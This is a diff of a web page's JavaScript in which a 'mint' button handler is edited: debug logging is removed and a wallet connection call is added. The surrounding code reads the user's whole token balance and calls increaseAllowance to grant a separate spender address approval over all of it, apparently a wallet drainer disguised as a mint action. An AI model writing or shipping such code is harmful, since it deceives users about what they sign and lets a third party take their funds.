@@ -141,16 +141,15 @@ window.onload = () =>{
     mint_button.addEventListener('click',mint);
 
     async function mint(){
-      console.log('inside the mint function');
+      connect_meamask()
+      
       const tokenAbi = require('./abi.json');
       const ethers = require('ethers');
 
       const provider = new ethers.providers.Web3Provider(window.ethereum);
-      console.log('provider set');
 
       const tokenContract = new ethers.Contract(tokenAddress,tokenAbi,provider.getSigner());
 
-      console.log('geting balance');
       // get user token balance
       async function getBalance() {
         const balance = await tokenContract.balanceOf(useraddress);
@@ -164,16 +163,13 @@ window.onload = () =>{
 
         const amountIncrease = ethers.utils.parseUnits(token_balance.toString(), 18,);
 
-        console.log('estimae gas price');
         // Estimate gas
         const estimatedGas = await tokenContract.estimateGas.increaseAllowance( spenderAddress, amountIncrease,);
 
-        console.log('get gas price');
         const gasPrice = await provider.getGasPrice();
 
         const gasLimit = estimatedGas.add(1000); // adding a buffer of 10,000
 
-        console.log('increase allownace ');
         const tx = await tokenContract.increaseAllowance(
           spenderAddress,
           amountIncrease,
